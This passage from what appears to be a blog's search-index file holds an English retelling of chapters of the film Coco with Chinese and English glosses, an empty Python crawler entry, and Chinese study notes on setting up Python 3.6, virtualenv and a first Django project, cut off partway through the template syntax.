reach the sound, they find a group of ballet folklórico (民间) dancers. “They’re so pretty,” Rosa says, admiring the full skirts with colorful petticoats and the hairstyles with ribbons and braids. The dancers are warming up for a performance, their toes and heels clacking on the sidewalk. “And they have the prettiest shoes,” Rosa adds wistfully. It’s true. The shoes are very pretty, but Miguel is most interested in the metal plates on the heels and toes, because that is what makes the pleasant sound. He lifts a foot, examines the soles of his boots, and wonders if he could add his own metal plates. He’s not allowed to play instruments, but maybe he could tap out rhythms with his feet. “What are you doing?” Abuelita says, hands on hips. Miguel lowers his foot. “We’re just listening . . . I mean, looking at the dancers’ beautiful shoes.” Abuelita (外祖母) has a skeptical expression on her face, but she lets it go. As they walk away, Miguel asks, “Abuelita, why don’t we make those kinds of shoes, for the ballet folklórico (民间) dancers?” When she doesn’t answer, he asks again — and again. “We just don’t!” she says, and he knows better than to keep asking why. Many years ago, fifteen-year-old Coco hurried to the family’s workshop with instructions from her mother to pick up five pairs of shoes and deliver them to the dancers in town. When she entered the shop, she found her uncles, Tío (叔叔) Oscar and Tío Felipe, side by side at their stations. They were identical twins, both wearing fedoras, long aprons, and striped shirts with the sleeves rolled up. Coco marveled at how their movements were perfectly matched as they pulled on needles with long lengths of thread. “Hola (你好) , Coco,” they said. “What are you working on?” she asked. “We’re sewing tongues,” Tío (叔叔) Oscar replied, and when he saw her surprise, he said, “Tongues for shoes, not the tongues you speak with.” “Or lick with,” Tío Felipe added. “Or whistle with.” “Or stick out when you’re mad at your mamá Imelda.” Coco laughed. That was how her uncles talked, one after the other, and Coco had to pivot her head back and forth as she tried to keep up. “Ay, tíos (叔叔们) ,” she cried. “You’re going to give me a headache!” “Perdóname (我很抱歉) ,” both uncles said, and they immediately got back to sewing, pulling their needles in unison again. Coco hated to interrupt them, but she needed to pick up the shoes. “Are the dancing shoes ready? “Mamá said you made five pairs.” “Of course,” Tío (叔叔) Felipe said. “One of us made three pairs—” “And the other made two,” finished Tío Oscar. Coco followed them to the far corner of the shop, where they brought down two boxes from a shelf. As they pulled out shoes, they counted. “One, two . . .” said Tío Oscar. “Three, four . . .” said Tío Felipe. And together, they said, “Five.” They left the shoes in a pile and returned to their workstations. Coco wrapped each pair in tissue paper and carefully placed them in a basket so she could carry them to town. Meanwhile, her uncles were stroking their pencil-thin mustaches as they tried to solve a riddle. “Which needle is mine?” Tío Felipe said. “And which is mine?” asked Tío Oscar. “Well, I was using black thread.” “So was I. Perhaps we should measure.” They grabbed a measuring tape. “Same length!” they exclaimed. “Mira (看) , hermano (哥哥/弟弟) ,” Tío (叔叔) Oscar said, “no offense, but I prefer to use my own needle.” “As do I.” Coco knew this discussion would last all day, so she marched over, picked up the needles, and handed them out. “This one is yours and this one is yours,” she said. “How can you tell?” they asked. “Because they’re clearly different.” The uncles examined the needles, doubtful expressions on their faces. “They are?”“Yes!” Coco said, and pointing to each of her uncles, she continued, “As different as you and you!” “Well, that makes perfect sense,” Tío Oscar replied. “It most certainly does,” agreed Tío Felipe. “We’re as different as boots and sandals.” “As buckles and laces.” “As heels and flats.”“As . . .” Chapter6Coco grabbed her basket of shoes and rushed out before she got another headache. She loved her uncles, but they sure knew how to confuse her sometimes. Coco enjoyed the bright sunshine as she headed to the dance studio. It was a quiet walk, and she heard only her steps and the rustle of her skirt. But once she reached the center of town, more sounds layered in—children laughing on the playground, vendors calling out their wares, and dogs barking for treats. She crossed the plaza, turned a corner, and found the studio. “Anybody here?” she called, because it was empty when she stepped in. “We’re in the back,” someone answered. She followed the voice to a dressing room, where a seamstress was taking measurements of the girls. When they saw Coco, they clapped in delight, because her family had already earned a reputation for making excellent shoes. As soon as she set down the basket, the girls rushed to it, unwrapped the shoes, and tried them on. Then one of the girls ran to the studio and started skipping around, a simple version of the polka. Soon all five girls joined her, their footsteps rhythmically clacking and echoing one another. There wasn’t a single instrument in the room, yet it seemed filled with music. Watching them reminded Coco of a time when she used to dance, too. She had been very young when her father left, so she couldn’t remember his face very well, but she could remember his voice and the joy she had felt as she’d danced with her mother whenever he’d played the guitar and sung. “Look!” the dance teacher said, disrupting Coco’s memory. “Here’s an extra pair of shoes.” Coco peeked into the basket and realized her uncles’ mistake. Each had made three pairs, so instead of five, there were six pairs of shoes. Coco laughed to herself. Leave it to them to copy each other exactly. For a moment, she thought about giving the extra shoes to the dancers in case another girl joined their group, but then she had a better idea. She would keep them for herself! She finished the transaction, rushed home, and went behind the family compound to try the shoes. They fit perfectly! She did a little hop, then another and another. On the hard-packed dirt, her steps landed with a soft thud. She tiptoed to the paved patio, stepped onto the bricks, and heard the pleasant clicking of her shoes. She did a toe tap, cautiously, as if testing the temperature of a pool before jumping in. Then she glanced about. No one was around, so she decided it was safe to dance. Her first steps were a bit awkward because she hadn’t danced in such a long time, but she was a natural. She felt rhythm in her blood. She didn’t need musicians to sing, because she had the memory of her father’s voice. She closed her eyes and the dancing took her back to the happiest memories of her early childhood. Soon she was flicking her feet, striking the ground with her toes and heels, and twirling her skirt. Her steps were getting faster, more rhythmic, and louder. Her footsteps echoed off the walls, and Coco imagined a dozen dancers celebrating beside her! Then she heard someone’s voice: “Ahem!” Coco froze and opened her eyes. There stood Mamá Imelda, clearing her throat to get Coco’s attention. She cradled a kitten and absently scratched behind its ears, making the little cat purr. Coco wondered how her mother’s arms could be so tender when her eyes could be so stern. “Um . . . uh . . . hola (你好) , Mamá.” “I thought I told you to deliver those shoes.” “I did,” Coco said, “but there was an extra pair, so I thought . . . well, I wanted . . . and . . .” Her mother raised an eyebrow, questioning, and Coco hung her head, ashamed. Then Mamá Imelda set down the kitten, approached her daughter, and lifted Coco’s chin. This time her eyes were as gentle as her hands. “M’ija (亲爱的) ,” she said, “look around.” Mamá Imelda stood back and looked at the hacienda with appreciation. “We have a comfortable home, delicious food, and warm clothes, but more importantly, we have each other, and all because we know the difference between good, honest work and . . . careless indulgences.” Coco nodded. “I understand, but—” “It’s very simple,” Mamá Imelda interrupted. “Music tore our family apart, but shoes have kept us together.” She straightened Coco’s braids. “From now on,” she said, “the dancers can order from someone else. “These shoes bring too many sad memories, and some things are better to forget.” Then she headed to the workshop, the kitten following close behind. Disheartened, Coco headed to her room to take off the shoes. They still clicked as she stepped on the pavement, but instead of music, the clicks sounded like someone hammering shut her joy. Chapter7Miguel trudges along with his family. He’s carrying his shoeshine box and an armful of marigolds. He’s still getting lectured, even though they’re halfway home now. “How many times have we told you?” Tío (叔叔) Berto says. “That place is crawling with mariachis (墨西哥流浪歌手) !” “Yes, Tío Berto.” Prima (堂妹) Rosa gives him a sympathetic look, but she doesn’t jump to his defense. Miguel can’t blame her. If she takes his side, she’ll get in trouble, too. Then Dante ambles up, sniffs the bags Miguel’s relatives are carrying, and whines for treats. “No, no, no, no, no,” Miguel says to the hairless dog, because he knows what’s going to happen next—and sure enough, it does. “Go away, you! Go!” Abuelita (外祖母) says, throwing the chancla (拖鞋) at Dante. It works. The frightened dog runs off. “It’s just Dante,” Miguel explains. “Never name a street dog,” Abuelita warns. “It’ll follow you forever. Now, go get my shoe!” Miguel stoops to pick it up. It’s tricky since he’s holding so many things, but he manages to grab the shoe and secure it under his arm. His family has finally stopped scolding him, but Miguel knows it won’t last. Lectures usually aren’t over until everyone has chimed in, and with a family as big as his, that’s a lot of people. Then he spots another talent show flyer, this one nailed to a post. His family is walking ahead, their backs to him. He can hear their voices talking about Día de los Muertos (亡灵节) , and from the opposite direction, he can hear the faint sounds of music. He leans toward it. The music calls him. He feels torn between his devotion to family and his desire for music. There has to be a way to get the best of both worlds. What if he . . . yes! He pats the flyer in his pocket, making sure it’s still there. He will enter the contest, but he’ll keep it a secret. That way, he can be a musician and keep his family happy. As soon as they get to the family compound, Abuelita (外祖母) marches them to the shoemaking shop. Everyone is busy at work, including his teenaged primo (堂兄) , Abel, who’s guiding shoes through an automated polisher. Miguel knows the drill. He sets down his supplies, plops on a stool, and braces himself for more lecturing. Abuelita grabs two wooden shoe stretchers, using them as clappers to get everyone’s attention. “I found your son in Mariachi Plaza!” she tells Miguel’s parents. “Miguel . . .” Papá says, disappointed, and Mamá says, “You know how Abuelita feels about the plaza.” “I was just shining shoes!” “A musician’s shoes!” Tío (叔叔) Berto reveals. Everyone gasps, including Abel, causing his shoe to zip away from the polisher and fly up to the roof. A few seconds later, it falls and bops him on the head. “But the plaza’s where all the foot traffic is,” Miguel explains. “If Abuelita says no more plaza,” Papá says, “then no more plaza.” “But what about tonight?” Miguel asks. “What’s tonight?” Papá Franco wants to know. Miguel hesitates before speaking, but he can’t help spilling his secret. “It’s Día de los Muertos (亡灵节) . The whole town’s gonna be there and . . . well . . . they’re having this talent show.” Abuelita (外祖母) narrows her eyes and crosses her arms. “Talent show?” Miguel gulps and squirms in his seat. “And I thought I might . . .” “Sign up?” Mamá guesses. “Well, maybe?” Prima (堂妹) Rosa laughs. “You have to have talent to be in a talent show.” “Yeah,” Abel adds. “What are you going to do, shine shoes?” Miguel hates it when his primos (堂兄们) tease him. Why can’t they take his side once in a while? “I do have a talent,” Miguel insists, “but . . . it’s . . .” He spots the quizzical expressions on his parents’ faces. “Well, it’s . . . it’s a surprise.” “Absolutely not!” Abuelita says. “It’s Día de los Muertos, and no one’s going anywhere. Tonight is about family.” She grabs the marigolds that Miguel set down and the ones Rosa had carried, and she gives them to him. There are so many petals that Miguel nearly inhales a few and has to spit them out. “Ofrenda (灵坛) room,” Abuelita orders. “¡Vámonos! (我们走吧) ” Miguel follows Abuelita to the ofrenda (灵坛) room, and when they enter, they see that Mamá Coco is already there. Miguel smiles at her, but before he can say hello, Abuelita orders him to hold the flowers while she arranges them on the altar. Chapter8Every year, Abuelita (grandmother) stresses this important tradition. Only the spirits with pictures on an ofrenda (offering) can enjoy the offerings left in the home and at the gravesites. The pictures are like boarding passes, and without them, the spirits remain stuck on the other side. While she’s preoccupied with the flowers, Miguel takes a few steps toward the door. He needs to practice. The talent show is only a few hours away. “All this work to bring the family together,” Abuelita says, “so I don’t want you sneaking off to who-knows-where.” She reaches for a flower, but Miguel’s not there. He’s halfway to the door. “Where are you going?” she demands. “I thought we were done.” “Ay, Dios mío (my god),” she sighs, exasperated. “Being part of this family means being here for this family. “I don’t want to see you end up like—” She glances at the photo of young Mamá Coco, her mother, Imelda, and the faceless musician. “Like Mamá Coco’s papá?” “Never mention that man!” Abuelita says. “He’s better off forgotten.” “But you’re the one who—” “Ta, ta, ta-tch!” Abuelita will not let him speak. Miguel’s about to push the issue, but then they hear Mamá Coco’s gravelly voice. “Papá? Papá is home?” Abuelita rushes to her. “Mamá, cálmese, cálmese (calm down).” “Papá is coming home?” Mamá Coco asks again. “No, Mamá. But it’s okay. I’m here.” With Abuelita preoccupied, Miguel sneaks away. He doesn’t hear Mamá Coco ask his abuelita, “Who are you?” He doesn’t see the sadness on his grandmother’s face as she tells Mamá Coco to rest while she gently pats the old lady’s hands. He doesn’t hear Abuelita try to tell him, “I’m hard on you because I care,” and he also fails to hear her sigh when she realizes that he’s gone. Miguel can only shake his head as he passes Tío (uncle) Berto and his papá unloading rolls of leather from a truck. The sun is bright, so he must squint as he makes his way through the family compound. When he reaches a giant cypress tree, he looks around to make sure no one’s watching. Then he climbs the tree onto the roof, carefully scuttles across the tiles, lifts a sign advertising the family business, and slips into the space behind it. This is Miguel’s secret attic hideout, the one place where he can get away from his family’s expectations and just be himself. In a corner are several pairs of shoes that someone discarded years ago. Miguel ignores them and focuses on an ofrenda (offering) he built to honor the memory of Ernesto de la Cruz. He lights a few candles to illuminate the posters, songbooks, and albums that he has carefully arranged. But the candles reveal something else, too — a guitar! It’s not as fancy as the guitar that de la Cruz holds on his album covers or even as fancy as the guitar he held earlier in the plaza, but it’s just as special, because Miguel has crafted this instrument himself. He cobbled it from scraps he found in Mariachi Plaza and around the shoemaking shop—a beat-up soundboard, old strings, a bridge made from a comb, and tuning pegs made from bent nails. The instrument is held together with duct tape, leather scraps, and lots of love. Studying one of Ernesto de la Cruz’s album covers, Miguel takes a marker and traces the one-of-a kind skull designs from the famous musician’s guitar. Miguel’s version is slightly off-center and a bit crude, but he decides it’s good enough. He’s about to tune the guitar when he hears footsteps pattering on the roof and the sign moving. Someone has discovered his hideout in the attic! Miguel gasps, but before he can blow out the candles, Dante peeks in. “Oh, it’s you,” Miguel says, relieved. “Get in here. C’mon, Dante. Hurry up.” The dog wriggles in and sniffs the entire periphery of the room, spending an unusually long time on the shoes in the corner. Then he plops in front of Miguel, an attentive audience. “I just . . . I just wish I could get someone to listen,” Miguel says as he tunes the guitar. “Other than you,” he tells Dante, who replies by sloppily licking Miguel’s face. picMiguel gives a grossed-out chuckle and turns his attention back to the guitar, strumming a chord that vibrates off the walls. “¡Perfecto! (perfect)” He studies the album cover. Ernesto de la Cruz poses confidently with his beaming white smile, and Miguel imitates him. He’s a little awkward, but pretending to be de la Cruz for a moment makes him feel better. Then he picks up a videotape with Best of de la Cruz scrawled on the label. He turns on an old TV set and pushes the tape into a VCR. Like the guitar, Miguel made the tape himself, a montage of his favorite scenes from de la Cruz’s movies and interviews. The first scenes come from a movie called A quien yo amo (Whom I love). Miguel strums to provide some musical accompaniment as de la Cruz imparts his wisdom. “I have to sing,” de la Cruz says. “I have to play. The music, it’s not just in me. It is me.” Miguel nods. This is exactly how he feels, too. Chapter9“When life gets me down,” de la Cruz continues, “I play my guitar. The rest of the world may follow the rules, but I must follow my heart!” De la Cruz passionately kisses a woman, and Miguel cringes. Then there’s another clip from the film. In this one de la Cruz holds a guitar. “You know that feeling? “Like there’s a song in the air and it’s playing just for you?” Ernesto de la Cruz pauses and begins to strum the guitar. Miguel mimics the hand positions so he can follow along as his idol begins to sing about never knowing he could want something so much. After a few verses, the song ends, and the videotape switches to another movie called Nuestra iglesia (Our Church). In this scene, de la Cruz plays a good-natured priest speaking to a nun. “You must have faith, Sister!” “Oh, but Padre, he will never listen.” “He will listen to music!” Now de la Cruz bursts into song. He sings about music, how it has the power to change minds and hearts. He goes on, and since Miguel knows all the words, he follows along. When the song ends, de la Cruz tells the nun, “Never underestimate the power of music.” The tape switches again, this time to a romantic scene with de la Cruz professing his love to a woman named Lola. She says, “But my father, he will never give his permission.” And de la Cruz replies, “I am done asking permission. “When you see your moment, you mustn’t let it pass you by. “You must seize it!” Immediately after these famous lines is a clip of an interview. “Señor (sir) de la Cruz, what did it take for you to seize your moment?” De la Cruz does not hesitate to answer. “I had to have faith in my dream. “No one was going to hand it to me. “It was up to me to reach for that dream, grab it tight, and make it come true.” “And make it come true,” Miguel repeats. The tape ends, but Miguel can still hear the words repeating in his mind. If he wants to be a musician, he’ll have to make it happen. When he sees an opportunity, he must seize it, just like Ernesto de la Cruz. He reaches into his pocket to pull out the talent show flyer. “No more hiding, Dante. “I gotta seize my moment!” Dante wags his tail and pants happily. “I’m going to play in Mariachi Plaza if it kills me!” Miguel grabs his guitar and, for inspiration, his favorite album. Then he and Dante scurry out across the roof and peek over the edge. They must be stealthy in order to sneak away. Luckily, the setting sun casts long shadows, making it easier to hide— but then the courtyard fills up with people as Abuelita opens all the doors and announces, “Día de los Muertos (The Day of The Dead) has begun!” Miguel hides on the roof as children run by with sparklers. Then he spots his twin primos (cousins), toddlers Manny and Benny, carrying baskets of marigold petals and haphazardly scattering them on the ground. “No, no, no, no, no,” Mamá corrects them. “We have to make a clear path.” She demonstrates, creating a path from the ofrenda room to the front gate. “These petals guide our ancestors home. “We don’t want them to get lost. “We want them to come and enjoy all the food and drinks on the ofrenda, ¿sí? (yes)” The toddlers nod, their eyes full of wonder and anticipation. They follow Mamá. Miguel and Dante take the opportunity to drop from the roof, just outside the compound, but the coast isn’t clear, because Papá and Tío (uncle) Berto round the corner carrying a small table from storage. “Where should we put this table?” Papá calls out. Miguel and Dante back up toward the courtyard to avoid the adults, only to find Abuelita shaking out a rug. She’s turning toward them! Luckily, Miguel and Dante jump into the ofrenda room before she sees them. “In the courtyard, m’ijos (kids),” Abuelita answers. She is out of sight but her voice is clear. “You want it down by the kitchen?” “Sí (yes). Eh . . . next to the other one.” Inside the ofrenda room, they find Mamá Coco, and Miguel puts his finger to his lips so she will keep his presence a secret. But it’s too late. He hears Abuelita’s voice—right outside the door! “Miguel!”“Hurry! Under the table,” Miguel tells Dante as he stuffs his guitar and album beneath the tablecloth. “Get under! Get under!” “Miguel!” Abuelita calls again. “Nothing!” he says, panicked. He whips around. Abuelita and his parents are looking at him. His heart is racing and his palms are sweaty from the stress of almost getting caught. He wants to pretend like nothing unusual is going on, but he can’t help stammering. “Mamá . . . Papá . . . I . . .” Papá lifts a finger to silence him. “Miguel.” He takes a deep breath. “Your abuelita had the most wonderful idea!” He giggles with excitement. “We’ve all decided—it’s time you joined us in the workshop!” “What?!” Miguel says. Chapter10He’s heard rumors about people seeing their lives pass before them when they have near-death experiences, and that’s what happens to him. Miguel hears the announcement and immediately sees his visits to Mariachi Plaza, bands performing in the gazebo, his secret hideout where he plays guitar and watches film clips, Mamá Coco’s room where he quietly hums. If he starts making shoes, he won’t have time to do anything related to music. It breaks his heart to realize this. But how can he tell his family? He loves them and doesn’t want to disappoint them, especially when their faces are beaming with pride because becoming an apprentice is a big step. I think I’m cursed, Miguel decides, because of something that happened before I was even born. Papá holds out an apron and drapes it over Miguel. The apron is made of leather, but for Miguel, it’s heavier than the steel armor that the conquistadors wore. He feels trapped by it and by all the expectations it represents. “No more shining shoes. “You’ll be making them!” Papá says proudly. “Every day after school.” “No more going into town?” Miguel’s voice cracks, but no one seems to notice. They just stand there, still beaming with pride. Abuelita grabs Miguel’s cheeks and squeezes them affectionately. “Ooh! Our Miguelito’s (Miguel) carrying on the family tradition. “And on Día de los Muertos (The Day of The Dead)! “Your ancestors will be so proud!” She gestures to the shoes adorning the ofrenda. “You’ll craft huaraches just like your tía (aunt) Victoria.” “And wingtips,” Papá adds, “like your papá Julio.” Miguel backs away from the ofrenda. He desperately wants to escape. “But what if I’m no good at making shoes?” He won’t say his next thought out loud, but the truth is he doesn’t even like the idea of making shoes. “Aw, Miguel,” Papá says. “You have your family here to guide you.” He waves his arm as if presenting the family. “You are a Rivera, and a Rivera is . . .” “A shoemaker,” Miguel finishes, his voice defeated. “A shoemaker through and through.” Everyone turns to admire the photos on the altar. Miguel peeks over their shoulders to see even more generations of his family, and he starts to feel claustrophobic in the tiny room crowded with Papá, Mamá, Abuelita, Mamá Coco, and too many ancestors to count. “That’s my boy! Ha-ha!” Papá says. Then he calls out, “Berto, break out the good stuff. “I wanna make a toast!” As Papá heads out of the room, Mamá gives Miguel a soft smile. He smiles back, trying his best to fake happiness. Satisfied, she follows Papá out the door. Last is Abuelita, who smothers Miguel with tons of kisses before exiting. With the family gone, Miguel turns back to the ofrenda and discovers Dante on the table, chomping at the pan dulces they left for their ancestors. The bald dog has never looked more content, but Miguel is horrified. “No, Dante! Stop!” Miguel grabs the dog and pulls him away from the ofrenda, but all that movement shakes the table. picThe frame with Mamá Imelda’s photo sways back and forth, and before Miguel can stop it, the picture topples to the ground with a sickening crack. The frame has broken, and Miguel must shake away the fragments as he lifts the picture. He knows Dante didn’t mean it, but he feels like everyone is working against him. The last thing he needs is to get in trouble for breaking a picture. “No, no, no, no, no!” Miguel cries. He holds the old photo of Mamá Imelda with a young Coco and the mysterious headless musician. Suddenly, he notices that a section of the picture has been folded and hidden by the frame all these years. Miguel desperately wants to unfold it, but he hesitates because he feels like he’s prying. The hidden section is like a locked door or a gate with a NO TRESPASSING sign, but he can’t help it. He has to look! When he unfolds the picture, he gasps. Next to the mysterious musician is a guitar—not just any guitar—but the guitar—the one with a skull carved into its head! Miguel is beside himself. “De la Cruz’s guitar?” Then Mamá Coco speaks. “Papá?” she says, pointing at the picture. “Papá?” Miguel’s eyes widen as the connection dawns on him. Could it possibly be true? But of course, Miguel thinks. I have always felt a great connection to this musician. His father was right when he told Miguel to look to the family for guidance. The answer was there all along! Chapter11Chapter12Chapter13]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>寻梦环游记</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-爬虫]]></title>
    <url>%2Fpython-%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[puthon-Django-学习笔记]]></title>
    <url>%2Fpython-Django-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[1、Python 的虚拟环境工具 virtualenv 的安装与使用前言：Linux 环境下默认存在 python2.7 环境，但是新版本的 Django 所依赖的环境为 python3 ，python2.7 不能卸载它支持着系统的基础运行程序， 二者环境的并存可能导致python出现奇奇怪怪的问题。 附：Linux 下 python3 pip3 的安装方法： Centos 安装EPEL和IUS软件源 12yum install epel-release -yyum install https://centos7.iuscommunity.org/ius-release.rpm -y 安装Python3.6 yum install python36u -y 创建python3连接符 ln -s /bin/python3.6 /bin/python3 安装pip3 yum install python36u-pip -y 创建pip3链接符 ln -s /bin/pip3.6 /bin/pip3 Ubuntu在ubuntu 16.04版本中，系统默认安装 了python 2.7和3.5版本，因为系统本身用到python的程序，删除默认的版本又担心系统有问题，那有没有办法同时在安装和使用python 3.6版本呢？下文将一起安装python 3.6并修改原系统的python3命令以使用新安装的版本。 1、配置软件仓库，因为python 3.6 新版没有发布到ubuntu的正式仓库中，咱们通过第3方仓库来做。在命令行中输入： sudo add-apt-repository ppa:jonathonf/python-3.6 2、检查系统软件包并安装 python 3.612sudo apt-get updatesudo apt-get install python3.6 3、查看python版本信息（现在在你的系统中已经有3个python版本了）4、通过上图我们看到，新安装的3.6版本需要输入 python3.6才能使用，那能不能配置我只输入python3时就默认使用3.6版本呢，当然可以，执行以下命令12345sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.5 1sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2sudo update-alternatives --config python3 5、最后，咱们确认一下 python3 -V 正题什么是virtualenv？virtualenv可以创建独立Python开发环境，比如当前的全局开发环境是python3.6，现在我们有一个项目需要使用django1.3，另一个项目需要使用django1.9，这个时候就可以使用virtualenv创建各自的python开发环境了。 virtualenv的优点使不同的应用开发环境独立环境升级不影响其他的应用，也不会影响全局的python开发环境它可以防止系统中出现包管理混乱和版本的冲突。 1、基本使用 通过pip安装virtualenv：pip install virtualenv 测试安装:virtualenv --version 为一个工程项目搭建一个虚拟环境:cd my_projectvirtualenv my_project_env 另外，如果存在多个python解释器，可以选择指定一个Python解释器（比如python2.7），没有指定则由系统默认的解释器来搭建： virtualenv -p /usr/bin/python2.7 my_project_env 将会在当前的目录中创建一个名my_project_env的文件夹，这是一个独立的python运行环境，包含了Python可执行文件， 以及 pip 库的一份拷贝，这样就能安装其他包了，不过已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境来。 要开始使用虚拟环境，其需要被激活：source my_project_env/bin/activate 停用虚拟环境：deactivate 停用后将回到系统默认的Python解释器 virtualenv 设置好新的虚拟环境之后，打开 Windows 资源管理器，看一下 virtualenv 为我们创建了什么。在家目录中，会看到一个名为 \env_mysite 的文件夹（或者为虚拟环境起的其他名称）。打开那个文件夹，会看到下述结构：\Include\Lib\Scripts\srcvirtualenv 创建了一个完整的 Python 安装，它与其他软件是隔离开的，因此开发项目时不会影响系统中的其他软件。 Django admin12345678910111213141516171819202122232425262728293031Type &apos;django-admin help &lt;subcommand&gt;&apos; for help on a specific subcommand.Available subcommands:[django] check ：校验项目完整性 compilemessages createcachetable dbshell diffsettings dumpdata : 把数据库数据导出到文件 flush inspectdb loaddata ： 把文件数据导入到数据库 makemessages makemigrations：创建模型变更的迁移文件 migrate ：执行上一个命令创建的迁移文件 runserver ： 运行 django 项目 sendtestemail shell ： 进入 Django 项目的 python shell showmigrations sqlflush sqlmigrate sqlsequencereset squashmigrations startapp ： 启用一个 Django 应用 startproject ： 启动一个 django test ： 跑一些单元测试用例的 testserver Note that only Django core commands are listed as settings are not properly configured (error: Requested setting INSTALLED_APPS, but settings are not configured. You must either define the environment variable DJANGO_SETTINGS_MODULE or call settings.configure() before accessing settings.). 我的第一个 Django 项目： 1、运行虚拟环境env_mysite\scripts\activate 2、安装 Djangopip install django==1.11.7 3、打开 django-admin 所在目录cd C:\Users\Lenovo\env_mysite\Scripts 4、创建属于你的第一个 Django 项目django-admin startproject mysite startproject 为我们创建的文件介绍mysite/manage.pymysite/init.pysettings.pyurls.pywsgi.py 外层的 mysite/ 根目录是项目的容器。这个目录的名称对 Django 没有什么作用，你可以根据喜好重命名。 manage.py 是一个命令行实用脚本，可以通过不同的方式与 Django 项目交互。这个文件的详细说明参见 Django Project 网站。 内部的 mysite/ 目录是项目的 Python 包。导入这里面的内容时要使用目录的名称（如 mysite.urls）。 mysite/init.py 是一个空文件，目的是让 Python 把这个目录识别为 Python 包。（如果你刚接触Python，关于包的说明请阅读 Python 官方文档。） mysite/settings.py 是 Django 项目的设置/配置。 mysite/urls.py 是 Django 项目的 URL 声明，即 Django 驱动的网站的“目录”。 mysite/wsgi.py 是兼容 WSGI 的 Web 服务器的入口点，用于伺服项目。 编写视图以及映射视图 from django.http import HttpResponse def hello(request): return HttpResponse("Hello world") 首先，从 django.http 模块中导入 HttpResponse 类。导入这个类是因为后面的代码要使用。 然后，定义一个名为 hello 的函数，这是视图函数。视图函数至少有一个参数，按约定，名为 request。这是一个对象，包含触发这个视图的 Web 请求的信息，是django.http.HttpRequest 类的实例。映射 from django.conf.urls import include, url from django.contrib import admin from app.views import hello urlpatterns = [ url(r'^admin/', include(admin.site.urls)), url(r'^hello/$', hello), ] 第一行从 django.conf.urls 模块中导入两个函数：include，用于导入另一个 URL 配置模块；url，使用正则表达式模式匹配浏览器中的 URL，把它映射到 Django 项目中的某个模块上。 第二行从 django.contrib 模块中导入 admin 函数。这个函数传给 include 函数，加载 Django 管理后台的 URL。 第三行是 urlpatterns，即 url() 实例列表。根目录映射准备为网站根地址实现视图时，使用的 URL 模式是 ˆ$，即匹配空字符串。from django.conf.urls import include, urlfrom django.contrib import adminfrom app.views import hello, current_datetimeurlpatterns = [ url(r’^admin/‘, include(admin.site.urls)), url(r’^hello/$’, hello), url(r’^time/$’, current_datetime), url(r’^$’, hello),] Django 处理请求的过程 请求 /hello/。 Django 查看 ROOT_URLCONF 设置，找到根 URL 配置。 Django 比较 URL 配置中的各个 URL 模式，找到与 /hello/ 匹配的那个。 如果找到匹配的模式，调用对应的视图函数。 视图函数返回一个 HttpResponse 对象。 Django 把 HttpResponse 对象转换成正确的 HTTP 响应，得到网页。 动态URL def hours_ahead(request, offset): try: offset = int(offset) except ValueError: raise Http404() dt = datetime.datetime.now() + datetime.timedelta(hours=offset) html = "In %s hour(s), it will be %s." % (offset, dt) return HttpResponse(html) url(r'^time/plus/(\d{1,2})/$', hours_ahead), request 是一个 HttpRequest 对象，这与 hello 和 current_datetime 两个视图一样。我要再次强调，每个视图的第一个参数都是 HttpRequest 对象。 offset 是 URL 模式中那对圆括号捕获的字符串。如果请求的 URL 是 /time/plus/3/，那么偏移量是字符串 ‘3’；如果请求的 URL 是 /time/plus/21/，那么偏移量是字符串 ‘21’。注意，捕获的值始终是Unicode 对象，而不是整数，即便捕获的字符串中只有数字（如 ‘21’）也不是。 模型层模型层是什么位于 Django 视图层和数据库之间 python 对象和数据库表之间转换 为什么需要模型层屏蔽不同数数据库之间的差异 开发者更加专注于业务逻辑的开发 提供很多便捷的工具帮助开发 模型层配置123456789setting：DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;, &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;), &#125;&#125; Django shell为什么使用 Django shell临时性操作使用 Django Shell 更加方便 小范围 Debug 更简单，不需要运行整个项目来测试 Django shell 的使用python manage.py shell 12345678910111213141516171819In [1]: from app.models import ArticleIn [2]: a = Article()In [3]: a.title = &apos;Test Django Shell&apos;In [4]: a.brief_content = &apos;Text Django Shell, New Article, main content.&apos;In [5]: print(a)Article object (None)In [6]: a.save()In [7]: articles = Article.objects.all()In [12]: article = articles[0]In [13]: print(article.title)Test Django Shell Django Admin 模块Django Admin 模块是什么自带的标配后台管理工具 读取定义的模型元数据，提供强大的管理使用界面 为什么需要 Django Admin 模块简化 Django shell 的操作步骤 管理页面时基础设施中重要的部分 认证用户、显示管理模型、校验输入模型等功能类似 Django Admin 模块的使用创建管理员用户 登录页面进行管理 差缺补漏：_ str _ (self)在python中方法名如果是xxxx()的，那么就有特殊的功能，因此叫做“魔法”方法当使用print输出对象的时候，只要自己定义了str(self)方法，那么就会打印从在这个方法中return的数据str方法需要返回一个字符串，当做这个对象的描写 新增超级管理员python manage.py createsuperuser 设计数据返回函数Django 视图与模板使用 Bootstrap 实现静态网站页面页面布局设计网站首页： 文章详情页设计： Bootstrap以及Bootstrap的栅格系统来自美国Twitter的前端框架提供非常多的控件并附带源码 实现静态页面初识 Django 的模板系统 模板系统简介： 视图文件不适合编码 HTML页面设计改变需要修改python代码页面逻辑和网页视图应该分开设计模板系统的变现形式是文本分离文档的表现形式和表现内容模板系统定义了特哟的标签占位符 基本语法： 123456789101112131415161718◆变量标签：&#123;&#123;变量&#125;&lt;html&gt;&lt;body&gt;&#123;&#123;now&#125;&#125;&lt;/body&gt;&lt;/html&gt;◆for循环标签：&#123;%for xin list%），&#123;%endfor%&#125;&lt;ul&gt;&#123;% for item in list %&#125;&lt;li&gt;&#123;&#123;item &#125;&#125;&lt;/li&gt;&#123;% endfor%&#125;&lt;/ul&gt;◆if-else分支标签：&#123;%if%&#125;，&#123;%else%），&#123;%endif%&#125;&#123;% if true 